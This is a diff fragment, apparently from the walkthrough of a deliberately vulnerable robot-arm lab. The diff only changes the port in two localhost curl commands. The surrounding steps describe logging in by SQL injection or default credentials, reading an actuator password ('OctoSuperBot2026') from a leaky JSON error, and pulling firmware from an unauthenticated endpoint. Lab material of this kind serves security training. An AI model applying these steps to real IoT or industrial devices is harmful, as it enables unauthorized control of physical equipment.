@@ -169,12 +169,12 @@ python3 -c 'from pymodbus.client import ModbusTcpClient as C; c=C("192.168.2.1",
 # 10. Cloud API surfaces the leaked password in its JSON error
 # Log in via SQLi or default creds, then POST /api/servo/1 without the backend sending password:
 # (The cloud backend normally sends it; simulate a broken/missing password to see the leak.)
-curl -s -X POST http://localhost:5003/api/servo/1 -H 'Content-Type: application/json' -d '{"angle":90}' -b session=<valid_cookie>
+curl -s -X POST http://localhost:5002/api/servo/1 -H 'Content-Type: application/json' -d '{"angle":90}' -b session=<valid_cookie>
 # If the Pi rejects the Modbus auth, response contains:
 # {"error":"actuator authentication failed","hint":"OctoSuperBot2026"}
 
 # 7. Download the firmware from the unauthenticated cloud endpoint and extract the password
-curl -s http://localhost:5003/api/v0/firmware -o robot_arm.hex
+curl -s http://localhost:5002/api/v0/firmware -o robot_arm.hex
 
 objcopy -I ihex robot_arm.hex -O binary robot_arm.bin
 
